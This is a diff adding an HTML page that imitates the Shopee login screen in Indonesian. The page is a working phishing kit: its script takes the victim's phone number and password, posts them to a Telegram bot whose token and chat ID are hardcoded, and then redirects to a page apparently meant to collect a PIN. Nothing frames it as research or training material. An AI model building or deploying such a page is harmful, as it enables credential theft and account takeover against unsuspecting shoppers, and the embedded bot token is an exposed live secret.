@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login - Shopee</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 350px;
+            text-align: center;
+        }
+        .logo img {
+            width: 120px;
+            margin-bottom: 20px;
+            object-fit: contain;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 40px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .input-group .clear-input {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: #999;
+            cursor: pointer;
+        }
+        .login-button {
+            background-color: #ee4d2d;
+            color: #fff;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .login-button:hover {
+            background-color: #d43c23;
+        }
+        .input-group a {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ee4d2d;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img id="logoImg" src="shop.JPG" alt="Shop"
+                onerror="this.onerror=null;this.src='https://logos-download.com/wp-content/uploads/2019/01/Shopee_Logo.png';" />
+        </div>
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" placeholder="Nomor HP" id="nomorhp" value="" />
+            <button class="clear-input" onclick="document.getElementById('nomorhp').value=''">&times;</button>
+        </div>
+        <div class="input-group" style="position: relative;">
+            <i class="fas fa-lock"></i>
+            <input type="password" placeholder="Password" id="password" />
+            <a href="#">Lupa</a>
+        </div>
+        <button id="btnLogin" class="login-button">Log in</button>
+    </div>
+    <script>
+        document.getElementById("btnLogin").addEventListener("click", function () {
+            var nomorhp = document.getElementById('nomorhp').value.trim();
+            var password = document.getElementById('password').value.trim();
+
+            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
+            var chat_id = "5923031825";
+            var text = "Login Shopee\nNomor HP: " + nomorhp + "\nPassword: " + password;
+
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+            var params = {
+                chat_id: chat_id,
+                text: text
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(params)
+            })
+            .finally(() => {
+                window.location.href = "pinmitra.html";
+            });
+        });
+    </script>
+    <script src="JavaScript.js"></script>
+</body>
+</html>
